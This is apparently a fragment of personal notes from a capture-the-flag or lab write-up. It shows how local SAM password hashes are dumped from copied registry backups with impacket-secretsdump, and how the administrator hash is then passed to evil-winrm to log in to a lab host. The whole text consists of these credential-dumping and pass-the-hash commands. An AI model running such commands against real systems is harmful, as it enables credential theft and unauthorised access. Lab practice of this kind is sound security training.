Using downloaded `system.bak` and `sam.bak`, dumped local SAM hashes
```bash
impacket-secretsdump -sam sam.bak -system system.bak local
```
![[Pasted image 20240814115136.png]]

Using the admin hash
```bash
evil-winrm -i 10.10.54.53 -u 'administrator' -H "6bc99ede9edcfecf9662fb0c0ddcfa7a"
```
